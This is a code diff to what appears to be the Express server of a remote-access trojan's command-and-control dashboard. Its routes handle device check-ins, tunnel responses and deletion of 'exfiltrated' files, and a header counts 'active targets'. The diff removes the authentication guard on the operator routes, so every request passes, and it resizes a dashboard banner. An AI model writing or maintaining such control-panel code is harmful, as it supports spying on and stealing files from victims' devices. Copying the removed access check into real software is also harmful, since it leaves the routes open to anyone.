@@ -372,11 +372,9 @@ app.post('/tunnel-response', handleTunnelResponse);
 app.post('/checkin/tunnel-response', handleTunnelResponse);
 
 // AUTHENTICATION GUARD MIDDLEWARE FOR OPERATOR ROUTES
+// Bypassed: Authentication is handled exclusively on-device via PasswordHasher / FirebaseConfig
 app.use((req, res, next) => {
-    if (isAuthenticated(req)) {
-        return next();
-    }
-    return serveLoginPage(req, res);
+    return next();
 });
 
 // Delete Exfiltrated File Endpoint
@@ -524,7 +522,7 @@ app.get('/', (req, res) => {
 <body>
     <div class="container">
         <div class="header" style="text-align:center; padding:5px 0; margin-bottom:5px;">
-            <img src="/c2/header_dashboard.png" style="width: 67.5%; max-width: 738px; height: auto; margin: 0 auto; display: block; object-fit: contain;" alt="LAB-RATS Header">
+            <img src="/c2/header_dashboard.png" style="width: 72.9%; max-width: 799px; height: auto; margin: 0 auto; display: block; object-fit: contain;" alt="LAB-RATS Header">
             <div style="font-size: 0.6rem; color: var(--neon-cyan); letter-spacing: 3px; text-transform: uppercase; margin-top: 15px; text-align: center;">SYSTEM STATUS: <span style="color:#39ff14;">ONLINE</span> &nbsp;//&nbsp; ACTIVE TARGETS: <span style="color:#00f2ff; font-weight:bold;">${onlineCount} / ${deviceList.length}</span> &nbsp;//&nbsp; TIMEZONE: <span style="color:#ffff00;">Ottawa (America/Toronto)</span></div>
         </div>
 
